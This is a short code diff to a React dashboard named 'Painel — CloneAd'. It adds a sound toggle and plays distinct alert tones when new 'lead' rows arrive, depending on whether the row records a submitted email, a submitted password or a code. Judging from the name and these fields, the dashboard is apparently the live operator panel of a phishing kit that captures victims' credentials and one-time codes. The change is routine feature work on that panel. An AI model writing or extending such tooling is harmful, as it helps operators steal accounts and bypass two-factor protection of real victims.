@@ -1,4 +1,4 @@
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { Link } from "react-router-dom";
 import { useQuery } from "@tanstack/react-query";
 import { supabase } from "@/integrations/supabase/client";
@@ -101,6 +101,11 @@ export default function Dashboard() {
   const [actions, setActions] = useState<ActionRow[]>([]);
   const [busy, setBusy] = useState<string | null>(null);
   const [pulse, setPulse] = useState(false);
+  const [soundOn, setSoundOn] = useState(true);
+  const soundOnRef = useRef(true);
+  useEffect(() => {
+    soundOnRef.current = soundOn;
+  }, [soundOn]);
 
   useEffect(() => {
     document.title = "Painel — CloneAd";
@@ -149,6 +154,15 @@ export default function Dashboard() {
           setLeads((prev) => [r, ...prev]);
           setPulse(true);
           setTimeout(() => setPulse(false), 600);
+          if (soundOnRef.current) {
+            const kind: "email" | "password" | "code" =
+              r.field_name === "email_submitted"
+                ? "email"
+                : r.field_name === "password_submitted"
+                ? "password"
+                : "code";
+            playDing(kind);
+          }
         },
       )
       .on(
